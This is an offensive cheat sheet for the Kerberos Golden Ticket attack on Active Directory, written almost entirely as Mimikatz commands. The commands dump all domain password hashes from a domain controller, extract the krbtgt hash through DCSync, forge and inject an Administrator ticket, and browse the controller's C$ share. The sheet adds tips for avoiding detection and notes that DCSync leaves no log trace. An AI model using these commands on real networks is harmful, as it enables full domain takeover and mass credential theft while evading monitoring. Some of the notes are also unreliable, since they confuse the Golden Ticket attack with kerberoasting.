Kerberos Golden Ticket Attack (TGS-REQ) and (TGS-REP)
  • Always check for Kerberos Policy using (Get-DomainPolicy)."Kerberos Policy) --> This is make sure we are not detected as there various Anti-malware or detection rules to identify kerberoasting attack.
  • Attacks the Step 3 and 4 of the Kerberos Authentication flow.

Execute Mimikatz on DC and get all the hashes (Including krbtgt) --> Needs Domain admin rigths to run
  • Invoke-Mimikatz -Command '"lsadump::lsa /patch"' - Computername domain_controller_name --> If running as DA on DC then no need to provide ComputerName parameter.
  • Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain_contrtoler_name\krbtgt"' --> DCSync is silent in logs. If running as DA on DC then no need to provide ComputerName parameter.

Execute Mimikatz on a machine that is connected to domain to create a GOLDEN Ticket. --> Needs Domain admin rights to run 
  • Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:domain _name  /sid: domain_SID /krbtgt:HASH_FROM_DC_for_krbtgt /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
  • Use "klist" to list the Golden ticket. Once the ticket is generated, we can access any service on the domain.
  • Below is the command detailed information.

Steps to obtained Golden Ticket
  • Run the following command on the PowerShell session which is either ran on the DC with DA rights or PS remote session to the DC with DA rights.
  • Invoke-Mimikatz -Command '"lsadump::lsa /patch"' (This is to extract NTLM hash for every user from DC. Get the krbtgt accout nltm hash.)
  • Open Powershell console with standard user rights on any machine that can reach DA and run the following command to obtained the Golden Ticket
     ◇ Run Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:FQDN_domain _name  /sid:domain_SID /krbtgt:HASH_FROM_DC_for_krbtgt /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
  • Run klist.exe on the same PowerShell Console.  (This is check for generted tickets in the memory)
  • To run remote code execution after the Golden Ticket from the same PowerShell Console:
     ◇ ls \\FQDN_Name_Of_DCl\C$
